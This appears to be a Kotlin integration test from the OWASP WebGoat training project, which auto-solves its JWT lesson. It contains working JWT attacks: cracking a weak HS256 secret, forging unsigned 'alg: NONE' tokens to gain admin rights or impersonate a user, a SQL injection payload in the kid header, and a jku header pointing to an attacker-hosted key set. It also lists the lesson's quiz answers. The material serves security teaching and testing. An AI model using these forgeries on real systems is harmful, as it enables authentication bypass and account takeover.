/*
 * SPDX-FileCopyrightText: Copyright © 2019 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.integration

import com.fasterxml.jackson.databind.ObjectMapper
import com.fasterxml.jackson.databind.node.ObjectNode
import io.jsonwebtoken.Header
import io.jsonwebtoken.JwsHeader
import io.jsonwebtoken.JwtException
import io.jsonwebtoken.Jwts
import io.jsonwebtoken.SignatureAlgorithm
import io.jsonwebtoken.impl.TextCodec
import io.restassured.RestAssured
import org.hamcrest.CoreMatchers
import org.hamcrest.MatcherAssert
import org.jose4j.jwk.JsonWebKeySet
import org.jose4j.jwk.RsaJsonWebKey
import org.junit.jupiter.api.Test
import org.owasp.webgoat.lessons.jwt.JWTSecretKeyEndpoint
import java.security.KeyPairGenerator
import java.security.interfaces.RSAPublicKey
import java.time.Instant
import java.util.Base64
import java.util.Calendar
import java.util.Date

class JWTLessonIntegrationTest : IntegrationTest() {
    @Test
    fun solveAssignment() {
        startLesson("JWT")

        decodingToken()
        resetVotes()
        findPassword()
        buyAsTom()
        deleteTomThroughKidClaim()
        deleteTomThroughJkuClaim()
        quiz()

        checkResults("JWT")
    }

    private fun generateToken(key: String): String =
        Jwts
            .builder()
            .setIssuer("WebGoat Token Builder")
            .setAudience("webgoat.org")
            .setIssuedAt(Calendar.getInstance().time)
            .setExpiration(Date.from(Instant.now().plusSeconds(60)))
            .setSubject("tom@webgoat.org")
            .claim("username", "WebGoat")
            .claim("Email", "tom@webgoat.org")
            .claim("Role", arrayOf("Manager", "Project Administrator"))
            .signWith(SignatureAlgorithm.HS256, key)
            .compact()

    private fun getSecretToken(token: String): String? {
        for (key in JWTSecretKeyEndpoint.SECRETS) {
            try {
                Jwts.parser().setSigningKey(TextCodec.BASE64.encode(key)).parse(token)
            } catch (e: JwtException) {
                continue
            }
            return TextCodec.BASE64.encode(key)
        }
        return null
    }

    private fun decodingToken() {
        MatcherAssert.assertThat(
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .formParam("jwt-encode-user", "user")
                .post(webGoatUrlConfig.url("JWT/decode"))
                .then()
                .statusCode(200)
                .extract()
                .path("lessonCompleted"),
            CoreMatchers.`is`(true),
        )
    }

    private fun findPassword() {
        val accessToken: String =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .get(webGoatUrlConfig.url("JWT/secret/gettoken"))
                .then()
                .extract()
                .response()
                .asString()

        val secret = requireNotNull(getSecretToken(accessToken)) { "Secret not found in token" }

        MatcherAssert.assertThat(
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .formParam("token", generateToken(secret))
                .post(webGoatUrlConfig.url("JWT/secret"))
                .then()
                .statusCode(200)
                .extract()
                .path("lessonCompleted"),
            CoreMatchers.`is`(true),
        )
    }

    private fun resetVotes() {
        val accessToken: String =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .get(webGoatUrlConfig.url("JWT/votings/login?user=Tom"))
                .then()
                .extract()
                .cookie("access_token")

        var header = accessToken.substring(0, accessToken.indexOf("."))
        header = String(Base64.getUrlDecoder().decode(header.toByteArray(Charsets.UTF_8)))

        var body = accessToken.substring(1 + accessToken.indexOf("."), accessToken.lastIndexOf("."))
        body = String(Base64.getUrlDecoder().decode(body.toByteArray(Charsets.UTF_8)))

        val mapper = ObjectMapper()
        var headerNode = mapper.readTree(header)
        headerNode = (headerNode as ObjectNode).put("alg", "NONE")

        var bodyObject = mapper.readTree(body)
        bodyObject = (bodyObject as ObjectNode).put("admin", "true")

        val replacedToken =
            String(Base64.getUrlEncoder().encode(headerNode.toString().toByteArray()))
                .plus(".")
                .plus(String(Base64.getUrlEncoder().encode(bodyObject.toString().toByteArray())))
                .plus(".")
                .replace("=", "")

        MatcherAssert.assertThat(
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .cookie("access_token", replacedToken)
                .post(webGoatUrlConfig.url("JWT/votings"))
                .then()
                .statusCode(200)
                .extract()
                .path("lessonCompleted"),
            CoreMatchers.`is`(true),
        )
    }

    private fun buyAsTom() {
        var header =
            String(
                Base64.getUrlDecoder().decode("eyJhbGciOiJIUzUxMiJ9".toByteArray(Charsets.UTF_8)),
            )

        var body =
            String(
                Base64.getUrlDecoder().decode(
                    "eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0".toByteArray(Charsets.UTF_8),
                ),
            )

        body = body.replace("Jerry", "Tom")

        val mapper = ObjectMapper()
        var headerNode = mapper.readTree(header)
        headerNode = (headerNode as ObjectNode).put("alg", "NONE")

        val replacedToken =
            String(Base64.getUrlEncoder().encode(headerNode.toString().toByteArray()))
                .plus(".")
                .plus(String(Base64.getUrlEncoder().encode(body.toByteArray())))
                .plus(".")
                .replace("=", "")

        MatcherAssert.assertThat(
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .header("Authorization", "Bearer $replacedToken")
                .post(webGoatUrlConfig.url("JWT/refresh/checkout"))
                .then()
                .statusCode(200)
                .extract()
                .path("lessonCompleted"),
            CoreMatchers.`is`(true),
        )
    }

    private fun deleteTomThroughKidClaim() {
        val header = mutableMapOf<String, Any>()
        header[Header.TYPE] = Header.JWT_TYPE
        header[JwsHeader.KEY_ID] = "hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --"
        val token =
            Jwts
                .builder()
                .setHeader(header)
                .setIssuer("WebGoat Token Builder")
                .setAudience("webgoat.org")
                .setIssuedAt(Calendar.getInstance().time)
                .setExpiration(Date.from(Instant.now().plusSeconds(60)))
                .setSubject("tom@webgoat.org")
                .claim("username", "Tom")
                .claim("Email", "tom@webgoat.org")
                .claim("Role", arrayOf("Manager", "Project Administrator"))
                .signWith(SignatureAlgorithm.HS256, "deletingTom")
                .compact()

        MatcherAssert.assertThat(
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .post(webGoatUrlConfig.url("JWT/kid/delete?token=$token"))
                .then()
                .statusCode(200)
                .extract()
                .path("lessonCompleted"),
            CoreMatchers.`is`(true),
        )
    }

    private fun deleteTomThroughJkuClaim() {
        val keyPairGenerator = KeyPairGenerator.getInstance("RSA")
        keyPairGenerator.initialize(2048)
        val keyPair = keyPairGenerator.generateKeyPair()
        val jwks = JsonWebKeySet(RsaJsonWebKey(keyPair.public as RSAPublicKey))
        RestAssured
            .given()
            .`when`()
            .relaxedHTTPSValidation()
            .cookie("WEBWOLFSESSION", webWolfCookie)
            .multiPart("file", "jwks.json", jwks.toJson().toByteArray())
            .post(webWolfUrlConfig.url("fileupload"))
            .then()
            .extract()
            .response()
            .body
            .asString()

        val header = mutableMapOf<String, Any>()
        header[Header.TYPE] = Header.JWT_TYPE
        header[JwsHeader.JWK_SET_URL] = webWolfUrlConfig.url("files/$user/jwks.json")

        val token =
            Jwts
                .builder()
                .setHeader(header)
                .setIssuer("WebGoat Token Builder")
                .setAudience("webgoat.org")
                .setIssuedAt(Calendar.getInstance().time)
                .setExpiration(Date.from(Instant.now().plusSeconds(60)))
                .setSubject("tom@webgoat.org")
                .claim("username", "Tom")
                .claim("Email", "tom@webgoat.org")
                .claim("Role", arrayOf("Manager", "Project Administrator"))
                .signWith(SignatureAlgorithm.RS256, keyPair.private)
                .compact()

        MatcherAssert.assertThat(
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .post(webGoatUrlConfig.url("JWT/jku/delete?token=$token"))
                .then()
                .statusCode(200)
                .extract()
                .path("lessonCompleted"),
            CoreMatchers.`is`(true),
        )
    }

    private fun quiz() {
        val params = mutableMapOf<String, Any>()
        params["question_0_solution"] = "Solution 1"
        params["question_1_solution"] = "Solution 2"

        checkAssignment(webGoatUrlConfig.url("JWT/quiz"), params, true)
    }
}
